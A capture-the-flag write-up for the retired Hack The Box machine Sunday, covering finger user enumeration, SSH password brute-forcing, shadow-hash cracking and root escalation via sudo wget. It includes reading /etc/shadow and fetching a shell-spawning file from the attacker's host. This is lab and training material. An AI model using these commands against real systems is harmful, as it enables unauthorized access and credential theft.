# Sunday

This is the write-up for the box Sunday that got retired at the 29th September 2018.
My IP address was 10.10.14.16 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.76    sunday.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/sunday.nmap 10.10.10.76
```

```markdown
PORT      STATE    SERVICE         VERSION
79/tcp    open     finger          Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp   open     rpcbind         2-4 (RPC #100000)
(...)
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos
```

Scanning all ports:
```markdown
nmap -p- 10.10.10.76 --max-retries 0 -Pn
```

```markdown
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
22022/tcp open  unknown
34445/tcp open  unknown
43278/tcp open  unknown
```

Enumerating services on the three unknown ports:
```markdown
nmap -p 22022,34445,43278 -sC -sV 10.10.10.76
```

```markdown
PORT      STATE SERVICE VERSION
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey:
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
34445/tcp open  unknown
43278/tcp open  unknown
```

## Checking Solaris fingerd (Port 79)

The Solaris fingerd process is open on port 79 and can be enumerated with either **Metasploit** or [this finger-enum-script on GitHub](https://github.com/pentestmonkey/finger-user-enum).

Metasploit:
```markdown
use auxiliary/scanner/finger/finger_users

set RHOSTS 10.10.10.76

exploit
```

Perl script:
```markdown
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76 | less -S
```

Both ways result in enumerating active usernames on the box.
The specified username list also finds two users called _sammy_ and _sunny_ that were logged in:
```markdown
root@10.10.10.76:   root     Super-User pts/3   <Apr 24, 2018> sunday
sammy@10.10.10.76:  sammy               pts/2
sunny@10.10.10.76:  sunny               pts/2
```

Lets try to brute-force the password of _sunny_ and login via SSH.
The tool **Hydra** does not work because the box uses an old Key-Exchange algorithm, so instead I will use **Patator**:
```markdown
patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0
```

After a while it finds a password for the user _sunny_:
> sunday

Login with credentials:
```markdown
ssh -okexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76
```

## Privilege Escalation

Lets see which root privileges this user has with `sudo`:
```markdown
sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
```

The binary only displays _"testing"_ and the output of the `id` command and nothing else.

When looking at the root (/) directory, there is a non-default folder called _backup_ with a file called _shadow.backup_.
This is a _shadow file_ with the password hash of the users on the box:
```markdown
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Lets try to crack the password of _sammy_ with **Hashcat**:
```markdown
hashcat -m 7400 sunday.hash /usr/share/wordlists/rockyou.txt
```

After a while it cracks the password for the user:
> cooldude!

### Privilege Escalation to root

This user has the following root privileges with `sudo`:
```markdown
sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

It is possible to read and execute local files with `wget`:
```markdown
sudo wget -i /etc/shadow
```

So we can create a file called _troll_, upload it on the box and execute it to get a shell as root. The file just executes `bash`.
Start a web server with that file and upload it with `wget`:
```markdown
sudo wget 10.10.14.16:8000 -O /root/troll
```

Now this has to be executed with the root privileges of _sunny_:
```markdown
sudo /root/troll
```

This has to be done fast, as there is a script that rewrites _/root/troll_ every 5 seconds.
After uploading the new _/root/troll_ file and then executing it with _sunny_, it spawn a shell as root!
